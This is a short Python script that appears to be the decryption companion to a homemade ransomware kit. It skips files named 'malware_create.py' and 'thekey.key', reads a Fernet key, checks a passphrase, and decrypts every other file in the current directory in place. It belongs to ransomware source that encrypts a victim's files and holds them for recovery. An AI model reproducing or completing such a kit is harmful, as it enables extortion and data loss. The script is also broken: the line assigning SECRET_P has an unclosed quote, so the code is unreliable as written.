import os as o
from cryptography.fernet import Fernet as frn

files = []
FILE = 'thekey.key'
SECRET_P = 'o.getenv("SECRET_P")

if not SECRET_P:
    print("You Dont have the necessary permission here")
    exit()

for file in o.listdir():
    if file == 'malware_create.py' or file == 'thekey.key' or file == 'decrypt.py':
        continue
    if o.path.isfile(file):
        files.append(file)

print(files)

with open(FILE , 'rb') as k:
    secr = k.read()

ph = input("Enter your Secret Phase : ").strip().lower()

if ph == SECRET_P:
    for file in files:
        with open(file , 'rb') as fl:
            con = fl.read()
        dec_con = frn(secr).decrypt(con)
        with open(file , 'wb') as wl:
            wl.write(dec_con)
else:
    print("Not the Intended person\nOr Maybe Try again and nope I'm not gonna help you")
